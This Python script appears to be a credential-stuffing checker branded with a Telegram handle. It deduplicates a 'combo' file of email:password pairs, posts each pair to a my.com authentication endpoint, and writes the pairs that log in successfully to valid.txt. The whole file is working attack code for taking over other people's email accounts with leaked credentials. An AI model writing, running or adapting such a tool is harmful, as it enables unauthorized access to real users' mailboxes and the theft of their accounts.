from colorama import Fore, Style
import sys
import os
import time
import platform

import webbrowser
import requests

#webbrowser.open('https://t.me/JustFaQTool')

def clear():
    os.system('cls' if os.name == 'nt' else 'clear')
    
banner = f'''{Fore.RED}
\t\t  █████▒▄▄▄        █████   ███▄ ▄███▓ ▄▄▄       ██▓ ██▓    ▄▄▄       ▄████▄   ▄████▄  ▓█████   ██████   ██████ 
\t\t▓██   ▒▒████▄    ▒██▓  ██▒▓██▒▀█▀ ██▒▒████▄    ▓██▒▓██▒   ▒████▄    ▒██▀ ▀█  ▒██▀ ▀█  ▓█   ▀ ▒██    ▒ ▒██    ▒ 
\t\t▒████ ░▒██  ▀█▄  ▒██▒  ██░▓██    ▓██░▒██  ▀█▄  ▒██▒▒██░   ▒██  ▀█▄  ▒▓█    ▄ ▒▓█    ▄ ▒███   ░ ▓██▄   ░ ▓██▄   
\t\t░▓█▒  ░░██▄▄▄▄██ ░██  █▀ ░▒██    ▒██ ░██▄▄▄▄██ ░██░▒██░   ░██▄▄▄▄██ ▒▓▓▄ ▄██▒▒▓▓▄ ▄██▒▒▓█  ▄   ▒   ██▒  ▒   ██▒
\t\t░▒█░    ▓█   ▓██▒░▒███▒█▄ ▒██▒   ░██▒ ▓█   ▓██▒░██░░██████▒▓█   ▓██▒▒ ▓███▀ ░▒ ▓███▀ ░░▒████▒▒██████▒▒▒██████▒▒
\t\t ▒ ░    ▒▒   ▓▒█░░░ ▒▒░ ▒ ░ ▒░   ░  ░ ▒▒   ▓▒█░░▓  ░ ▒░▓  ░▒▒   ▓▒█░░ ░▒ ▒  ░░ ░▒ ▒  ░░░ ▒░ ░▒ ▒▓▒ ▒ ░▒ ▒▓▒ ▒ ░
\t\t ░       ▒   ▒▒ ░ ░ ▒░  ░ ░  ░      ░  ▒   ▒▒ ░ ▒ ░░ ░ ▒  ░ ▒   ▒▒ ░  ░  ▒     ░  ▒    ░ ░  ░░ ░▒  ░ ░░ ░▒  ░ ░
\t\t ░ ░     ░   ▒      ░   ░ ░      ░     ░   ▒    ▒ ░  ░ ░    ░   ▒   ░        ░           ░   ░  ░  ░  ░  ░  ░  
\t\t             ░  ░    ░           ░         ░  ░ ░      ░  ░     ░  ░░ ░      ░ ░         ░  ░      ░        ░  
\t\t                                                                    ░        ░                                 
\n\t\t\t            [{Style.RESET_ALL} Telegram{Fore.RED}: @{Style.RESET_ALL}JustFaQ{Fore.RED} ]{Style.RESET_ALL} {Fore.RED}[{Style.RESET_ALL}{platform.python_version()}{Fore.RED}]     {Fore.RED}[{Style.RESET_ALL}0{Fore.RED}] {Style.RESET_ALL}Telegram Channels       {Fore.RED}[{Style.RESET_ALL}99{Fore.RED}] {Style.RESET_ALL}Exit
'''



def menu():
    clear()
    print(banner)
    print(f"\n            {Fore.RED}[{Style.RESET_ALL}${Style.RESET_ALL}{Fore.RED}]{Style.RESET_ALL} Enter your combo file {Fore.RED}....{Style.RESET_ALL} ")
    

def extractMail():
    menu()
    
    
    dup = 0
    openFile = open('b.txt', "r")
    writeFile = open("clean_combo.txt", "w") 
    valid = 0
    tmp = set()
    
    for txtLine in openFile:
        if txtLine not in tmp:
            writeFile.write(txtLine)
            tmp.add(txtLine)
        else:
            dup += 1
    openFile.close()
    writeFile.close()
    clear()
    print(banner)
    print(f"\n            {Fore.RED}[{Style.RESET_ALL}${Style.RESET_ALL}{Fore.RED}]{Style.RESET_ALL} Removed {Fore.RED}{dup}{Style.RESET_ALL}  Duplicated Lines.")
    with open('clean_combo.txt', 'r') as f:
        with open('valid.txt', 'w') as valid:
            file = f.readlines()
            for line in file:
                print(line)
                email = line.split(':')[0]
                psw = line.split(':')[1]
                url = "https://aj-https.my.com/cgi-bin/auth?model=&simple=1&Login=" + email + "&Password=" + psw
                r = requests.post(url)
                print(r.text)
                print(email)
                print(psw)
                
                
                input()
                if r.text == "Ok=1":
                    print(f"\n            {Fore.GREEN}[{Style.RESET_ALL}${Style.RESET_ALL}{Fore.GREEN}]{Style.RESET_ALL} {line}")
                    valid.write(line)
                else:
                    print(f"\n            {Fore.RED}[{Style.RESET_ALL}${Style.RESET_ALL}{Fore.RED}]{Style.RESET_ALL} {line}")
                    
                    
                

extractMail()